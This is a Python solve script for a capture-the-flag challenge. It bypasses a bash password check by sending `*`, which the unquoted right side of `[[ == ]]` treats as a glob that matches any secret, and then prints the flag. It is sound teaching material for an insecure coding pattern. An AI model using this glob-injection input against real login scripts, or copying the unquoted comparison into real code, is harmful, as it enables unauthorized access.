#!/usr/bin/env python3
"""
password-please — AlpacaHack Daily 2026-08-02

chal.sh checks `[[ $secret == $password ]]` with $password UNQUOTED on the right
side of ==, so bash treats it as a glob *pattern*. Sending `*` matches any
$secret, so the check always passes and /flag.txt is printed.

Usage: python3 solve.py <host> <port>
"""
import socket, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(20)
time.sleep(0.3)
s.sendall(b"*\n")              # glob pattern matching any secret
buf = b""
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
        buf += d
except Exception:
    pass
s.close()
m = re.search(rb"Alpaca\{[^}]*\}", buf)
print(m.group(0).decode() if m else buf.decode(errors="replace"))
